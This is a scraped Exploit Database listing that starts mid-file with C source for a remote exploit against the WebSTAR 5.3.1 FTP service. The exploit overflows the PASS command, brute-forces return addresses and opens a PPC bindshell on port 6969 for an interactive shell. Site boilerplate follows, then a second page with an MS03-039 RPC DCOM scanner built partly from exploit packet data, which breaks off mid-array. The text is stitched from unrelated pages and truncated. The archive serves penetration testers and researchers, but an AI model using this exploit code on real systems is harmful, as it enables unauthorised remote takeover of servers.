Prototypesint usage (void);int get_connect (int port, char *host);int send_sock (char *buff);int read_sock (char *buff);int check_bindshell(int port, char *host);//Variablesint sock, port=21, lsb;char evilbuff[MAXSIZE], temp[MAXSIZE];char user[] = "USER 4D4D" "\x0d\x0a";char retaddy[5], filler[MAXSIZE];unsigned long int ret, loop;int main (int argc, char *argv[]){char shellcode[] = //PPC forkin bindshell 6969 by B-r00t.2003."\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x68\x02\xa6\x3b\xeb\x01\x70""\x39\x80\x01\x70\x3b\xdf\xff\x88\x7c\xbe\x29\xae\x3b\xdf\xff\x89""\x7c\xbe\x29\xae\x3b\xdf\xff\x8a\x7c\xbe\x29\xae\x3b\xdf\xff\x8b""\x7c\xbe\x29\xae\x38\x6c\xfe\x92\x38\x8c\xfe\x91\x38\xac\xfe\x96""\x38\x0c\xfe\xf1\x44\xff\xff\x02\x60\x60\x60\x60\x7c\x67\x1b\x78""\x38\x9f\xff\x84\x38\xac\xfe\xa0\x38\x0c\xfe\xf8\x44\xff\xff\x02""\x60\x60\x60\x60\x7c\xe3\x3b\x78\x38\x8c\xfe\x91\x38\x0c\xfe\xfa""\x44\xff\xff\x02\x60\x60\x60\x60\x7c\xe3\x3b\x78\x38\x8c\xfe\x90""\x38\xac\xfe\x90\x38\x0c\xfe\xae\x44\xff\xff\x02\x60\x60\x60\x60""\x38\x8c\xfe\x90\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60""\x38\x8c\xfe\x91\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60""\x38\x8c\xfe\x92\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60""\x38\x0c\xfe\x92\x44\xff\xff\x02\x60\x60\x60\x60\x39\x1f\xff\x83""\x7c\xa8\x29\xae\x38\x7f\xff\x7c\x90\x61\xff\xf8\x90\xa1\xff\xfc""\x38\x81\xff\xf8\x38\x0c\xfe\xcb\x44\xff\xff\x02\x41\x41\x41\x41""\x41\x41\x41\x41\x2f\x62\x69\x6e\x2f\x73\x68\x58\xff\x02\x1b\x39""\x41\x41\x41\x41"; // Yu Cant Get This Stuff In Storez Man!!!char nops[] ="\x60\x60\x60\x60\x60\x60\x60\x60";printf ("\n%s by B-r00t <br00t@blueyonder.co.uk>. (c) 2003.\n",EXPLOIT);printf ("\nExploits the pre authentication buffer overflow inthe");printf ("\nWebSTAR 5.3.1 FTP service.");if (argc < 2)usage ();printf ("\nPatience ...\n\n");memset(filler, '\0', sizeof(filler));memset(filler, 0x78, 173);filler[0] = 'P';filler[1] = 'A';filler[2] = 'S';filler[3] = 'S';filler[4] = 0x20;for (lsb=0; lsb<9; lsb+=4) {//Increase range if no succcess.for (loop=0xf018f504+lsb; loop<0xf028f505+lsb; loop+=0x1000){ret=loop;printf ("\n[0x%x] ", ret);retaddy[0] = (int)((ret & 0xff000000) >> 24);retaddy[1] = (int)((ret & 0x00ff0000) >> 16);retaddy[2] = (int)((ret & 0x0000ff00) >> 8);retaddy[3] = (int) (ret & 0x000000ff);retaddy[4] = '\0';memset(evilbuff, '\0', sizeof(evilbuff));strcpy (evilbuff, filler);strcat (evilbuff, retaddy);strcat (evilbuff, nops);strcat (evilbuff, shellcode);strcat (evilbuff, "\x0d\x0a");if ((sock=socket(AF_INET, SOCK_STREAM, 6)) == -1){perror(" Retrying! ");loop-=0x1000;sleep(2);continue;}if (get_connect(FTP_PORT, argv[1]) ==-1){perror(" Retrying! ");loop-=0x1000;sleep(2);close(sock);continue;}read_sock(temp);send_sock (user);read_sock(temp);send_sock (evilbuff);read_sock(temp);close(sock);sleep(3);// Let service respawn!check_bindshell(BINDSHELL_PORT, argv[1]);}}printf("\n\nIf its still up... Go Again!\n\n");exit(0);}//End_Main//Check For Bindshell 6969int check_bindshell(int port, char *host){fd_set rfds;int sel=0, rd=0;char *ptr = temp;memset(temp, '\0', MAXSIZE);if((sock=socket(AF_INET, SOCK_STREAM, 6))== -1){perror("Socket Error.");return -1;}if (get_connect(port, host) <0){close (sock);return -1;}else printf (" Yay~!\n\aWo0tWo0t! ... We got a shell on%s!\n\n>", host);// Start clean ..fflush(stdin);fflush(stdout);fflush(stderr);do {FD_ZERO(&rfds);FD_SET(0, &rfds);FD_SET(sock, &rfds);sel=select(sock+1, &rfds, NULL, NULL, NULL);memset(temp, '\0', MAXSIZE);if (sel) {if(FD_ISSET(sock, &rfds)) {rd=(read_sock(temp));printf("%s", temp);}if(FD_ISSET(0, &rfds)) {rd=(read(0, ptr, MAXSIZE-1));send_sock(temp);}}} while( sel && rd );close(sock);printf ("\nShell Aborted!\n");exit(0);}//Do Socket Connectint get_connect (int port, char *host){struct sockaddr_in dest_addr;dest_addr.sin_family = AF_INET;dest_addr.sin_port = htons(port);if (! inet_aton(host, &(dest_addr.sin_addr)))return -1;memset( &(dest_addr.sin_zero), '\0', 8);if (connect (sock, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr)) == -1){printf(" Fail!");close(sock);return -1;}else return 0;}//Send Data To Socketint send_sock (char *buff){int bytes = 0;bytes = (send (sock, buff, strlen(buff), 0));if (bytes == -1){perror("Send Error.");close(sock);return -1;}else return bytes;}//Read Data From Socketint read_sock (char *buff){int bytes = 0;bytes = (recv (sock, buff, MAXSIZE-1, 0));if (bytes == -1){perror ("Recv Error.");close(sock);return -1;}else return bytes;}//Usage Messageint usage (void){printf ("\n\nUsage: %s [IP_ADDRESS] ", EXPLOIT);printf ("\nExample: %s 10.0.0.1 \n\n", EXPLOIT);exit (-1);}// milw0rm.com [2003-09-11]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 97
Microsoft Windows - 'RPC DCOM' Scanner (MS03-039) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - 'RPC DCOM' Scanner (MS03-039)EDB-ID:97CVE:2003-0605EDB Verified:Author:Doke ScottType:remoteExploit:/Platform:WindowsDate:2003-09-12Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*dcom2_scanner.cscan for second dcom vulnerability (MS03-039)by Doke Scott, doke at udel.edu, 10 Sep 2003based on work by:*  buildtheb0x presents : dcom/rpc scanner*  ---------------------------------------*  by: kid and farpand on packet sniffs of MS's dcom2 scanner*/#define d_dcom_scan_timeout 5  // max seconds for individual dcom scan#include <stdio.h>#include <stdlib.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <unistd.h>#include <netdb.h>#include <fcntl.h>#include <unistd.h>#include <signal.h>#include <errno.h>#define null NULL// for sun spro cc wierdness?  seg faults without this#define my_inet_ntoa(ip) inet_ntoa( *( (struct in_addr *) &ip ) )static char *program_name;static int verbose = 0;int dcom_scan_timeout = d_dcom_scan_timeout;volatile int timed_out = 0;volatile int dcomsockfd = 0;extern char *optarg;extern int optind, opterr, optopt;voidprint_hex( unsigned char *data, int len ) {int i, j;char alphastr[ 17 ];for ( i = 0, j = 0; i < len; i++, j++ ) {if ( j == 0 ) {alphastr[ j ] = isprint( data[i] ) ? data[i] : '.';printf( "%04x  %02x", i, data[ i ] & 0xff );}else if ( j == 15 ) {alphastr[ j ] = isprint( data[i] ) ? data[i] : '.';alphastr[ j + 1 ] = 0;printf( " %02x   %s\n", data[ i ] & 0xff, alphastr );j = -1;}else {alphastr[ j ] = isprint( data[i] ) ? data[i] : '.';printf( " %02x", data[ i ] & 0xff );}}if ( j )  {alphastr[ j + 1 ] = 0;for ( ; j < 16; j++ )printf( "   " );printf( "   %s\n", alphastr );}}/** based on:**  buildtheb0x presents : dcom/rpc scanner*  ---------------------------------------***  by: kid and farp**  greets: kajun, phr_, dvdman, Sam, flatline, #nanog, synD, and to all danny's waitress's**/#define DEST_PORT 135///////////////////////////// first request packet, bind request// from dcom1 exploit codeunsigned char bindstr[]={0x05, 0x00, 0x0B, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,0x7F, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0x00, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0xa0, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11,0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00};// from dcom1 dcom_scanzunsigned char fear1[] = {0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,0x09, 0x00, 0x00, 0x00, 0xd0, 0x16, 0xd0, 0x16, 0x00, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x00, 0xb8, 0x4a, 0x9f, 0x4d,0x1c, 0x7d, 0xcf, 0x11, 0x86, 0x1e, 0x00, 0x20, 0xaf, 0x6e, 0x7c, 0x57,0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00};// sniffed from dcom2 scanner, when scanning patched machineunsigned char request1[] = {0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0xd0, 0x16, 0xd0, 0x16, 0x00, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0xa0, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00};unsigned char expected1[] = {0x05, 0x00, 0x0c, 0x03, 0x10, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0xd0, 0x16, 0xd0, 0x16, 0x28, 0x57, 0x00, 0x00,0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,};///////////////////////////// second request packet// from dcom1 exploit codeunsigned char exploit_request1[]={0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x7e, 0x00, 0x00, 0x00,0x09, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x6b, 0xac, 0xd8, 0x08, 0x2f, 0x2e, 0x03, 0x48, 0xaa, 0xdc, 0xc1, 0x6a,0x62, 0xfb, 0xeb, 0x98, 0x00, 0x00, 0x00, 0x00, 0xf8, 0x91, 0x7b, 0x5a,0x00, 0xff, 0xd0, 0x11, 0xa9, 0xb2, 0x00, 0xc0, 0x4f, 0xb6, 0xe6, 0xfc,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x38, 0xff, 0x0a, 0x00,0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x01, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x07, 0x00};// from dcom1 dcom_scanzunsigned char fear2[] = {0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x7e, 0x00, 0x00, 0x00,0x09, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x6b, 0xac, 0xd8, 0x08, 0x2f, 0x2e, 0x03, 0x48, 0xaa, 0xdc, 0xc1, 0x6a,0x62, 0xfb, 0xeb, 0x98, 0x00, 0x00, 0x00, 0x00, 0xf8, 0x91, 0x7b, 0x5a,0x00, 0xff, 0xd0, 0x11, 0xa9, 0xb2, 0x00, 0xc0, 0x4f, 0xb6, 0xe6, 0xfc,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x38, 0xff, 0x0a, 0x00,0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x01, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x07, 0x00};// sniffed from dcom2 scanner, when scanning unpatched machineunsigned char request2[] = {0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0xb0, 0x03, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x98, 0x03, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00,0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xe0, 0xab, 0x14, 0x00, 0x68, 0x03, 0x00, 0x00, 0x68, 0x03, 0x00, 0x00,0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0xa2, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0x38, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x38, 0x03, 0x00, 0x00,0x30, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x10, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x30, 0x03, 0x00, 0x00, 0xd8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x02, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x18, 0x01, 0x8d, 0x00, 0xb8, 0x01, 0x8d, 0x00, 0x00, 0x00, 0x00, 0x00,0x07, 0x00, 0x00, 0x00, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xab, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0xa5, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0xa6, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xa4, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0xad, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0xaa, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x07, 0x00, 0x00, 0x00,0x60, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00,0x58, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00,0x30, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x01, 0x10, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x10, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x5d, 0x88, 0x9a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,0x2b, 0x10, 0x48, 0x60, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xb8, 0x47, 0x0a, 0x00, 0x58, 0x00, 0x00, 0x00, 0x05, 0x00, 0x06, 0x00,0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xcc, 0xcc, 0xcc, 0xcc,0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0x80, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0xba, 0x09, 0x00,0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00,0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0xc0, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0x3b, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00,0x01, 0x00, 0x01, 0x00, 0x67, 0x3c, 0x70, 0x94, 0x13, 0x33, 0xfd, 0x46,0x87, 0x24, 0x4d, 0x09, 0x39, 0x88, 0x93, 0x9d, 0x02, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb0, 0x7e, 0x09, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x89, 0x0a, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x73, 0x00, 0x61, 0x00,0x6a, 0x00, 0x69, 0x00, 0x61, 0x00, 0x64, 0x00, 0x65, 0x00, 0x76, 0x00,0x5f, 0x00, 0x78, 0x00, 0x38, 0x00, 0x36, 0x00, 0x00, 0x00, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc,0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0x58, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 